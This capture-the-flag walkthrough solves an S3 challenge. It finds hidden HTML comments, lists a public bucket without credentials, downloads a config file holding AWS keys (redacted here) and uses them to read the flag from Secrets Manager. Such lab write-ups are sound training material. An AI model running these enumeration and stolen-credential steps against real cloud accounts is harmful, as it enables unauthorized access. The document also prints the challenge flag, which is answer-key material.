# Bucket List - Walkthrough

**Challenge:** Bucket List
**Points:** 100
**Flag:** `HiveCTF{publ1c_buck3ts_ar3_n0t_s3cur3}`

---

## Step 1: Visit the Website

Open the S3 static website URL in a browser:

```
http://<BUCKET_NAME>.s3-website-us-east-1.amazonaws.com
```

The page renders a professional-looking CloudNine Technologies marketing site. Nothing suspicious is visible on the rendered page.

## Step 2: View Page Source

Right-click the page and select "View Page Source" (or press `Ctrl+U` / `Cmd+U`).

Look for HTML comments. Two are hidden between the hero section and the services section:

```html
<!-- NOTE: Backup files moved to /backups/ directory. Remove before production launch. -->
<!-- Portal Config: /backups/employee-portal-config.bak -->
```

This tells us:
- There is a `/backups/` directory in the bucket
- It contains a file called `employee-portal-config.bak`

## Step 3: List the S3 Bucket

The bucket has public `ListBucket` enabled. We can enumerate its contents without any credentials.

Determine the bucket name from the website URL (the subdomain before `.s3-website-`), then list it:

```bash
aws s3 ls s3://<BUCKET_NAME> --no-sign-request
```

Output:

```
                           PRE backups/
2026-03-28 10:00:00       8234 index.html
2026-03-28 10:00:00       5612 style.css
```

List the backups directory:

```bash
aws s3 ls s3://<BUCKET_NAME>/backups/ --no-sign-request
```

Output:

```
2026-03-28 10:00:00        512 employee-portal-config.bak
```

## Step 4: Download the Backup File

```bash
aws s3 cp s3://<BUCKET_NAME>/backups/employee-portal-config.bak . --no-sign-request
```

Or simply fetch it via HTTP:

```bash
curl -s http://<BUCKET_NAME>.s3-website-us-east-1.amazonaws.com/backups/employee-portal-config.bak
```

## Step 5: Extract AWS Credentials

The `.bak` file is a configuration file containing AWS credentials:

```ini
[aws]
# Service account for portal backend - used by the employee directory lookup
aws_access_key_id = AKIA...
aws_secret_access_key = ...
region = us-east-1
```

## Step 6: Verify the Credentials

```bash
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity
```

This confirms the identity as `hivectf-ch1-reader`.

## Step 7: Retrieve the Flag

The IAM user has permission to read a specific Secrets Manager secret.

Try listing secrets to find available ones:

```bash
aws secretsmanager list-secrets
```

This shows a secret named `hivectf/challenge1/flag`. Retrieve it:

```bash
aws secretsmanager get-secret-value --secret-id hivectf/challenge1/flag
```

The `SecretString` field contains JSON:

```json
{"flag": "HiveCTF{publ1c_buck3ts_ar3_n0t_s3cur3}"}
```

Extract just the flag:

```bash
aws secretsmanager get-secret-value \
  --secret-id hivectf/challenge1/flag \
  --query SecretString \
  --output text | jq -r .flag
```

Output:

```
HiveCTF{publ1c_buck3ts_ar3_n0t_s3cur3}
```

---

## Skills Tested

- HTML source code inspection
- Understanding S3 static website hosting
- S3 bucket enumeration (`--no-sign-request`)
- Credential harvesting from exposed config files
- AWS CLI usage with stolen credentials
- Secrets Manager API interaction

## Common Mistakes

1. Not viewing the HTML source -- the comments are invisible on the rendered page
2. Not realizing S3 buckets can be listed publicly with `--no-sign-request`
3. Not knowing how to configure the AWS CLI with found credentials
4. Trying to brute-force the secret name instead of using `list-secrets`
